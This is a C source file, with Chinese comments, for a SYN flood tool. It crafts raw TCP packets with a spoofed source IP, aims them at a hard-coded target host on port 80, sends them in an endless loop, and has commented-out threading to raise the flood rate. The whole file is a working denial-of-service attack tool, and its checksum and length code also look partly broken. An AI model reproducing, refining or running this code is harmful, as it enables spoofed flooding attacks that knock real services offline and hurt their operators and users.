#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h> //ip
#include <netinet/tcp.h> //tcp
#include <stdlib.h>
#include <netinet/in.h>
#include <pthread.h>
#include <string.h>

//发sync包  icmp包
unsigned short ip_sum(unsigned short *addrr2, int len2) {
    register unsigned short *addrr = addrr2;
    register int len = len2;
    register int sum = 0;
    unsigned short answer = 0;

    while (len > 1) {
        sum += *addrr++;
        len -= 2;
    }
    if (len == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) addrr;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

//校验和涵数 ip头
unsigned short ipheadsum(unsigned short *packet, int packlen) {
    register unsigned long sum = 0;
    while (packlen > 1) {
        sum += *(packet++);
        packlen -= 2;
    }
    if (packlen > 0)
        sum += *(unsigned char *) packet;
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return (unsigned short) ~sum;
}

//校验和涵数 tcp头
unsigned short tcpheadsum(unsigned char *iphdr, unsigned short *packet, int packlen) {
    unsigned short *buf;
    unsigned short res;
    buf = malloc(packlen + 12);
    if (buf == NULL)
        return 0;
    memcpy(buf, iphdr + 12, 8); //源IP地址和目标IP地址
    *(buf + 4) = htons((unsigned short) (*(iphdr + 9)));
    *(buf + 5) = htons((unsigned short) packlen);
    memcpy(buf + 6, packet, packlen);
    res = ipheadsum(buf, packlen + 12);
    free(buf);
    return res;
}

void sendSync(void) {
    int sock, size, bytes_send;

    int bufSize = 8192;
    char synb[bufSize];
    memset(&synb, 0, sizeof(synb));

    struct sockaddr_in sin;

    struct ip *iphead = (struct ip *) synb;
    struct tcphdr *tcphead = (struct tcphdr *) (synb + sizeof(struct ip));

    printf("create socket\r\n");
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("10.1.108.90"); //被攻击的ip
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &size, sizeof(size)) < 0) {
        //IP_HDRINCL 在数据包中包含IP首部 int 这个选项常用于黑客技术中，隐藏自己的IP地址
        printf("2");
        perror("IP_HDRINCL");
        exit(1);
    }

    const int on = 1;//设定常量，用于打开广播模式
    //设定该接口上的广播模式
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0) {
        printf("2");
        perror("IP_HDRINCL");
        exit(1);
    }

    printf("create iphead\r\n");
    iphead->ip_v = 4;//版本号4 IP4用4
    iphead->ip_hl = 5;//little-endian IP头长度(单位为40位)5位
    iphead->ip_tos = 0x00;//服务类型 一般为0
    iphead->ip_len = sizeof(iphead) + sizeof(tcphead); //数据总长度 (单位为32位)
    iphead->ip_id = 1025;//标识16
    iphead->ip_off = 0;//分段偏移
    iphead->ip_ttl = 201; //生存时间
    iphead->ip_p = IPPROTO_TCP;//传输协议 tcp是6
    iphead->ip_sum = 0;//头校验和
    inet_aton("10.1.108.84", &iphead->ip_src);//假冒的ip  // 源地址 目标地址
    inet_aton("10.1.108.90", &iphead->ip_dst);//被攻击的ip

    printf("create tcphead\r\n");
    tcphead->source = htons(8001);//假冒的端口            // 源端口
    tcphead->dest = htons(80);//被攻击的端口                   // 目的端口
    tcphead->seq = htonl(3 + 64 << 8);// 序号
    tcphead->ack_seq = htons(0);// 确认号 收到的TCP信息的序号+1
    tcphead->syn = 1;//标志 同步
    tcphead->urg = 1;//标志 紧急
    tcphead->window = htons(0x20);//窗口
    tcphead->urg_ptr = htons(0x20);//紧急指针
    tcphead->check = ip_sum((short *) synb, (sizeof(struct ip) + sizeof(struct tcphdr) + 1) & ~1); //校验和

    iphead->ip_sum = ip_sum((short *) synb, (4 * iphead->ip_len + sizeof(struct tcphdr) + 1) & ~1);
    printf("start send\r\n");

//	int i = 10000;
    while (1) {
        bytes_send = sendto(sock, synb, 4 * iphead->ip_len + sizeof(struct tcphdr), 0, (struct sockaddr *) &sin,
                            sizeof(sin));
//		i--;
//		usleep(1000*10);//秒
    }
    printf("end send\r\n");
}

//#include <syswait.h>
//usleep(n) //n微秒
//Sleep（n）//n毫秒
//sleep（n）//n秒

int main(int argc, char *argv[]) {
    sendSync();
//	pthread_t id1, id2, id3;
//	int ret;
//	ret = pthread_create(&id1, NULL,(void *) sendSync, NULL);
//	if (ret != 0) {
//		printf("Create pthread error!\n");
//	}
//	ret = pthread_create(&id2, NULL,(void *) sendSync, NULL);
//	if (ret != 0) {
//		printf("Create pthread error!\n");
//	}
//	ret = pthread_create(&id3, NULL,(void *) sendSync, NULL);
//	if (ret != 0) {
//		printf("Create pthread error!\n");
//	}
//	pthread_join(id1, NULL);
//	pthread_join(id2, NULL);
//	pthread_join(id3, NULL);
}
//gcc -lpthread -o SendMySync SendMySync.c
